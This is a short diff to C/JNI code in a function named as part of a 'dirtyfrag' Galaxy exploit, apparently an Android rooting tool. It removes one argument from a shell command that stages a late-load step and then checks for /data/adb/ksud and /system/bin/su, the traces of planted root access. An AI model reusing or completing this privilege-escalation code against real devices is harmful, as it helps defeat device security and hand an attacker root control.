@@ -626,7 +626,6 @@ Java_dirtyfrag_galaxy_exploit_ExploitNative_nativeRunAll(JNIEnv *env, jclass clz
                         snprintf(cmd, sizeof(cmd),
                                  "/system/bin/logcat late-load "
                                  "--package-name %s --bootstrap-uid %d "
-                                 "--stage-from /data/system/ksud --ro-partitions "
                                  ">/data/local/tmp/d 2>&1 & sleep 12; "
                                  "ls -l /data/adb/ksud /system/bin/su "
                                  ">>/data/local/tmp/d 2>&1; "
